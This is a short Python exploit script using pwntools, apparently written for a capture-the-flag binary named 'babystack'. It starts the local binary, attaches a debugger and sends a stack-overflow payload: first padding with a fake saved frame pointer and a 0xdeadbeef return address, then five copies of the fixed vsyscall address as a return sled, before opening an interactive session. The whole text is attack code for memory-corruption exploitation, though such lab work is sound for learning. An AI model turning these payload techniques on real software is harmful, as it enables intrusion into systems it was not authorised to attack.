from pwn import *

context.log_level = 'debug'

p = process("./babystack")
elf = ELF("./babystack")

if __name__=='__main__':
#	system_got = elf.got["system"]

	#print system_got
	ebp = 'b'*0x8
	payload = 'a'*0x10+ebp+p64(0xdeadbeef)
	gdb.attach(p)
	payload = p64(0xffffffffff600000)*5
	p.sendline(payload)

	p.interactive()
